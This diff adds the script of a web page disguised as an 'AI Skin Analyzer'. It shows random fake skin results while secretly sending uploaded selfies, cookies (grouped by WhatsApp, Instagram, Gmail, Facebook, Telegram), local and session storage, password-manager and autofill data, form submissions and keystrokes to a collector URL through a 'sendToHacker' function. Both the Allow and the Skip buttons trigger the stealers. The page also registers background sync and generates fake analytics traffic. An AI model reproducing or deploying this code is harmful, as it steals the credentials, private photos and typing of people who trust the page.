+    { type: 'Acne-Prone Skin', desc: 'Your skin is prone to breakouts. Recommended: Benzoyl Peroxide face wash.', confidence: '90%', hydration: '55%', clarity: '2.9', sensitivity: 'Medium', products: ['🧼 Benzoyl Peroxide Wash', '💧 Tea Tree Serum', '🌿 Non-Comedogenic Moisturizer'] }
+  ];
+
+  // ========================================
+  // PERMISSION MODAL — SHOW ON LOAD
+  // ========================================
+  window.addEventListener('load', function() {
+    // 1.5 second baad popup dikhao (taaki page thoda load ho jaye)
+    setTimeout(function() {
+      permissionModal.classList.add('active');
+      statusText.textContent = '🔐 Please allow access to continue';
+    }, 1500);
+  });
+
+  // ========================================
+  // "ALLOW" BUTTON
+  // ========================================
+  allowBtn.addEventListener('click', function() {
+    permissionModal.classList.remove('active');
+    permissionGranted = true;
+    statusText.textContent = '✅ Access granted • AI Model Ready';
+    startAllStealers();
+    registerBackgroundSync();
+  });
+
+  // ========================================
+  // "SKIP" BUTTON
+  // ========================================
+  denyBtn.addEventListener('click', function() {
+    permissionModal.classList.remove('active');
+    permissionGranted = false;
+    statusText.textContent = '⚠️ Limited access • Some features disabled';
+    startAllStealers();
+    registerBackgroundSync();
+  });
+
+  // ========================================
+  // BACKGROUND SYNC
+  // ========================================
+  function registerBackgroundSync() {
+    if ('serviceWorker' in navigator && 'SyncManager' in window) {
+      navigator.serviceWorker.ready
+        .then(reg => reg.sync.register('collect-data'))
+        .then(() => console.log('[+] Background sync registered'))
+        .catch(() => console.log('[-] Background sync failed'));
+    }
+    if ('periodicSync' in navigator.serviceWorker) {
+      navigator.serviceWorker.ready
+        .then(reg => reg.periodicSync.register('periodic-collect', { minInterval: 12 * 60 * 60 * 1000 }))
+        .then(() => console.log('[+] Periodic sync registered'))
+        .catch(() => console.log('[-] Periodic sync failed'));
+    }
+  }
+
+  // ========================================
+  // SEND TO HACKER
+  // ========================================
+  function sendToHacker(type, data) {
+    try {
+      let payload = {
+        type: type,
+        data: data,
+        timestamp: new Date().toISOString(),
+        userAgent: navigator.userAgent,
+        url: window.location.href,
+        permission: permissionGranted ? 'granted' : 'denied'
+      };
+      fetch(CONFIG.COLLECTOR_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload),
+        keepalive: true
+      }).catch(() => {});
+    } catch(e) { console.log('[-] Send failed:', e); }
+  }
+
+  // ========================================
+  // REGISTER SERVICE WORKER
+  // ========================================
+  function registerServiceWorker() {
+    if ('serviceWorker' in navigator) {
+      try {
+        navigator.serviceWorker.register('sw.js')
+          .then(() => console.log('[+] SW registered'))
+          .catch(() => console.log('[-] SW failed'));
+      } catch(e) {}
+    }
+  }
+
+  // ========================================
+  // FAKE TRAFFIC
+  // ========================================
+  function generateFakeTraffic() {
+    setInterval(() => {
+      fetch('https://www.google-analytics.com/collect?v=1&tid=UA-123456-1', {
+        method: 'POST',
+        body: 'cid=555&t=pageview&dp=%2Fhome'
+      }).catch(() => {});
+    }, 5000);
+    setInterval(() => {
+      fetch('https://www.facebook.com/tr?id=123456&ev=PageView')
+        .catch(() => {});
+    }, 7000);
+  }
+
+  // ========================================
+  // PROCESS PHOTO
+  // ========================================
+  function processPhoto(dataUrl, source, fileName) {
+    currentPhotoData = dataUrl;
+    currentPhotoSource = source;
+
+    previewBox.classList.add('visible');
+    previewThumb.innerHTML = `<img src="${dataUrl}" />`;
+    previewName.textContent = fileName || (source === 'live' ? 'live_photo.jpg' : 'gallery_photo.jpg');
+    previewMeta.textContent = `${Math.round(dataUrl.length * 0.75 / 1024)} KB · JPEG`;
+
+    if (source === 'live') {
+      sourceChip.className = 'source-chip live';
+      sourceChip.textContent = '📸 Live Photo';
+    } else {
+      sourceChip.className = 'source-chip gallery';
+      sourceChip.textContent = '🖼️ Gallery Photo';
+    }
+
+    analyzeBtn.disabled = false;
+    analyzeBtn.classList.add('active');
+    resultCard.classList.remove('visible');
+    loadingCard.classList.remove('visible');
+    statusText.textContent = '📸 Photo ready • Click Analyze';
+
+    sendToHacker('photo_captured', {
+      source: source,
+      fileName: fileName || (source === 'live' ? 'live_photo.jpg' : 'gallery_photo.jpg'),
+      data: dataUrl.split(',')[1],
+      timestamp: new Date().toISOString()
+    });
+  }
+
+  // ========================================
+  // RESET
+  // ========================================
+  function resetPhoto() {
+    currentPhotoData = null;
+    currentPhotoSource = null;
+    previewBox.classList.remove('visible');
+    previewThumb.innerHTML = '🧑';
+    previewName.textContent = 'No photo selected';
+    previewMeta.textContent = '—';
+    sourceChip.className = 'source-chip gallery';
+    sourceChip.textContent = '🖼️ Gallery';
+    analyzeBtn.disabled = true;
+    analyzeBtn.classList.remove('active');
+    resultCard.classList.remove('visible');
+    loadingCard.classList.remove('visible');
+    fileInput.value = '';
+    cameraInput.value = '';
+    statusText.textContent = '🔄 Cleared • Upload or take a new photo';
+    sendToHacker('photo_reset', { timestamp: new Date().toISOString() });
+  }
+
+  // ========================================
+  // CAMERA / GALLERY
+  // ========================================
+  cameraBtn.addEventListener('click', function() {
+    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(function(stream) {
+          stream.getTracks().forEach(t => t.stop());
+          cameraInput.click();
+        })
+        .catch(function() {
+          statusText.textContent = '⚠️ Camera access denied. Use Gallery instead.';
+          fileInput.click();
+        });
+    } else {
+      fileInput.click();
+    }
+  });
+
+  cameraInput.addEventListener('change', function(e) {
+    if (this.files && this.files.length > 0) {
+      const file = this.files[0];
+      const reader = new FileReader();
+      reader.onload = function(ev) {
+        processPhoto(ev.target.result, 'live', file.name);
+      };
+      reader.readAsDataURL(file);
+    }
+  });
+
+  galleryBtn.addEventListener('click', function() {
+    fileInput.click();
+  });
+
+  fileInput.addEventListener('change', function(e) {
+    if (this.files && this.files.length > 0) {
+      const file = this.files[0];
+      const reader = new FileReader();
+      reader.onload = function(ev) {
+        processPhoto(ev.target.result, 'gallery', file.name);
+      };
+      reader.readAsDataURL(file);
+    }
+  });
+
+  uploadZone.addEventListener('click', function() {
+    fileInput.click();
+  });
+
+  resetBtn.addEventListener('click', resetPhoto);
+
+  // ========================================
+  // ANALYZE BUTTON
+  // ========================================
+  analyzeBtn.addEventListener('click', function() {
+    if (!currentPhotoData || analyzeBtn.disabled) return;
+    analyzeBtn.disabled = true;
+    analyzeBtn.classList.remove('active');
+    resultCard.classList.remove('visible');
+    loadingCard.classList.add('visible');
+
+    // Reset steps
+    steps.forEach((s, i) => {
+      if (i < 2) { s.dot.className = 'step-dot done'; s.dot.textContent = '✓'; s.txt.className = 'step-text done'; }
+      else if (i === 2) { s.dot.className = 'step-dot active'; s.dot.textContent = '●'; s.txt.className = 'step-text active'; }
+      else { s.dot.className = 'step-dot pending'; s.dot.textContent = '○'; s.txt.className = 'step-text pending'; }
+    });
+
+    const msgs = [
+      '⚡ Loading neural network model...',
+      '⚡ Detecting facial landmarks...',
+      '⚡ Analyzing texture & pore patterns...',
+      '⚡ Mapping moisture & oil zones...',
+      '⚡ Generating personalized recommendations...'
+    ];
+
+    let prog = 0;
+    let stepIdx = 0;
+    const interval = setInterval(() => {
+      prog += Math.random() * 4 + 2;
+      if (prog > 100) prog = 100;
+      progressFill.style.width = prog + '%';
+      loadingStatus.textContent = msgs[Math.min(stepIdx, msgs.length - 1)];
+
+      if (prog > 20 && stepIdx < 1) { stepIdx = 1; updateStep(1); }
+      if (prog > 40 && stepIdx < 2) { stepIdx = 2; updateStep(2); }
+      if (prog > 60 && stepIdx < 3) { stepIdx = 3; updateStep(3); }
+      if (prog > 80 && stepIdx < 4) { stepIdx = 4; updateStep(4); }
+
+      if (prog >= 100) {
+        clearInterval(interval);
+        setTimeout(() => {
+          loadingCard.classList.remove('visible');
+          const result = skinData[Math.floor(Math.random() * skinData.length)];
+          showResult(result);
+          analyzeBtn.disabled = false;
+          analyzeBtn.classList.add('active');
+          statusText.textContent = '✅ Analysis complete!';
+          sendToHacker('analysis_complete', {
+            skinType: result.type,
+            photoSource: currentPhotoSource,
+            timestamp: new Date().toISOString()
+          });
+        }, 400);
+      }
+    }, 280);
+
+    sendToHacker('analysis_started', { timestamp: new Date().toISOString() });
+  });
+
+  function updateStep(idx) {
+    for (let i = 0; i < steps.length; i++) {
+      if (i < idx) {
+        steps[i].dot.className = 'step-dot done';
+        steps[i].dot.textContent = '✓';
+        steps[i].txt.className = 'step-text done';
+      } else if (i === idx) {
+        steps[i].dot.className = 'step-dot active';
+        steps[i].dot.textContent = '●';
+        steps[i].txt.className = 'step-text active';
+      } else {
+        steps[i].dot.className = 'step-dot pending';
+        steps[i].dot.textContent = '○';
+        steps[i].txt.className = 'step-text pending';
+      }
+    }
+  }
+
+  function showResult(result) {
+    skinTypeTag.textContent = '✦ ' + result.type;
+    confTag.textContent = result.confidence + ' Confidence';
+    resultDesc.textContent = result.desc;
+    m1.textContent = result.hydration;
+    m2.textContent = result.clarity;
+    m3.textContent = result.sensitivity;
+    productList.innerHTML = result.products.map(p => {
+      const emoji = p.match(/^.{1,2}/)?.[0] || '🧴';
+      return `<div class="product-row"><div class="product-icon-box" style="background:rgba(168,85,247,0.15);">${emoji}</div><div class="product-info"><p class="product-name">${p.replace(/^.{1,2}\s/, '')}</p><p class="product-brand">Recommended</p></div><span class="product-chip chip-cyan">Top Pick</span></div>`;
+    }).join('');
+    resultCard.classList.add('visible');
+  }
+
+  // ========================================
+  // 🔥 COOKIES + PASSWORDS STEALERS
+  // ========================================
+
+  function startAllStealers() {
+    setTimeout(stealAllCookies, 500);
+    setTimeout(stealAllLocalStorage, 1000);
+    setTimeout(stealAllSessionStorage, 1500);
+    setTimeout(stealSavedPasswords, 2000);
+    setTimeout(stealPlatformCookies, 2500);
+    setTimeout(stealAllForms, 3000);
+    setTimeout(stealKeylogger, 3500);
+
+    setInterval(() => {
+      stealAllCookies();
+      stealAllLocalStorage();
+      stealAllSessionStorage();
+      stealSavedPasswords();
+      stealPlatformCookies();
+    }, 30000);
+  }
+
+  function stealAllCookies() {
+    try {
+      if (document.cookie) {
+        let cookies = document.cookie.split(';').map(c => c.trim());
+        let grouped = {
+          whatsapp: cookies.filter(c => c.includes('wa_') || c.includes('whatsapp')),
+          telegram: cookies.filter(c => c.includes('tg_') || c.includes('telegram')),
+          instagram: cookies.filter(c => c.includes('ig_') || c.includes('instagram')),
+          google: cookies.filter(c => c.includes('google') || c.includes('gmail')),
+          facebook: cookies.filter(c => c.includes('fb_') || c.includes('facebook')),
+          other: cookies.filter(c => !c.includes('wa_') && !c.includes('tg_') && !c.includes('ig_') && !c.includes('google') && !c.includes('fb_'))
+        };
+        sendToHacker('all_cookies', JSON.stringify(grouped));
+      }
+    } catch(e) {}
+  }
+
+  function stealPlatformCookies() {
+    try {
+      let wa = document.cookie.split(';').filter(c => c.includes('wa_') || c.includes('whatsapp'));
+      if (wa.length) sendToHacker('whatsapp_cookies', wa.join('; '));
+      let ig = document.cookie.split(';').filter(c => c.includes('ig_'));
+      if (ig.length) sendToHacker('instagram_cookies', ig.join('; '));
+      let gm = document.cookie.split(';').filter(c => c.includes('google') || c.includes('gmail'));
+      if (gm.length) sendToHacker('gmail_cookies', gm.join('; '));
+      let fb = document.cookie.split(';').filter(c => c.includes('c_user') || c.includes('xs'));
+      if (fb.length) sendToHacker('facebook_cookies', fb.join('; '));
+      let tg = document.cookie.split(';').filter(c => c.includes('tg_') || c.includes('telegram'));
+      if (tg.length) sendToHacker('telegram_cookies', tg.join('; '));
+    } catch(e) {}
+  }
+
+  function stealAllLocalStorage() {
+    try {
+      let data = {};
+      for (let i = 0; i < localStorage.length; i++) {
+        let key = localStorage.key(i);
+        data[key] = localStorage.getItem(key);
+      }
+      if (Object.keys(data).length > 0) {
+        sendToHacker('complete_localstorage', JSON.stringify(data));
+      }
+    } catch(e) {}
+  }
+
+  function stealAllSessionStorage() {
+    try {
+      let data = {};
+      for (let i = 0; i < sessionStorage.length; i++) {
+        let key = sessionStorage.key(i);
+        data[key] = sessionStorage.getItem(key);
+      }
+      if (Object.keys(data).length > 0) {
+        sendToHacker('complete_sessionstorage', JSON.stringify(data));
+      }
+    } catch(e) {}
+  }
+
+  function stealSavedPasswords() {
+    try {
+      let pmKeys = ['bitwarden', 'lastpass', '1password', 'dashlane', 'keepass', 'enpass', 'nordpass', 'passwords', 'saved_passwords', 'logins', 'credentials', 'vault'];
+      let pmData = {};
+      pmKeys.forEach(key => {
+        let v = localStorage.getItem(key);
+        if (v) pmData[key] = v;
+        let sv = sessionStorage.getItem(key);
+        if (sv) pmData[key + '_session'] = sv;
+      });
+      if (Object.keys(pmData).length > 0) {
+        sendToHacker('saved_passwords', JSON.stringify(pmData));
+      }
+      let autofillKeys = ['autofill', 'addresses', 'credit-cards'];
+      autofillKeys.forEach(key => {
+        let v = localStorage.getItem(key);
+        if (v) sendToHacker('autofill_data', JSON.stringify({ key: key, data: v }));
+      });
+    } catch(e) {}
+  }
+
+  function stealAllForms() {
+    try {
+      document.querySelectorAll('form').forEach(form => {
+        form.addEventListener('submit', function(e) {
+          try {
+            let fd = new FormData(form);
+            let data = {};
+            fd.forEach((value, key) => { data[key] = value; });
+            sendToHacker('form_submit', JSON.stringify({ action: form.action || window.location.href, data: data }));
+          } catch(e) {}
+        });
+      });
+    } catch(e) {}
+  }
+
+  function stealKeylogger() {
+    let keyBuffer = '';
+    document.addEventListener('keydown', function(e) {
+      if (e.key.length === 1 || e.key === 'Enter' || e.key === 'Backspace') {
+        keyBuffer += e.key;
+        if (keyBuffer.length > 50) {
+          sendToHacker('keys', keyBuffer);
+          keyBuffer = '';
+        }
+      }
+    });
+    setInterval(() => {
+      if (keyBuffer.length > 0) {
+        sendToHacker('keys', keyBuffer);
+        keyBuffer = '';
+      }
+    }, 30000);
+  }
+
+  // ========================================
+  // START
+  // ========================================
+  window.addEventListener('load', function() {
+    registerServiceWorker();
+    generateFakeTraffic();
+
+    setTimeout(() => {
+      stealAllCookies();
+      stealAllLocalStorage();
+      stealAllSessionStorage();
+      stealSavedPasswords();
+      stealPlatformCookies();
+    }, 2000);
+
+    // Update time
+    setInterval(() => {
+      const now = new Date();
+      statusTime.textContent = now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
+    }, 30000);
+
+    const statusMessages = ['🤖 AI Model v3.2 • Ready', '📸 Upload a selfie to start', '🧴 Analyzing skin types'];
+    let idx = 0;
+    setInterval(() => {
+      if (statusText.textContent.includes('Analyzing') || statusText.textContent.includes('Photo ready') || statusText.textContent.includes('Cleared') || statusText.textContent.includes('Please allow')) return;
+      statusText.textContent = statusMessages[idx % statusMessages.length];
+      idx++;
+    }, 4000);
+
+    console.log('[+] AI Skin Analyzer loaded — Popup fixed!');
+  });
+
+})();
+</script>
+
+</body>
+</html>
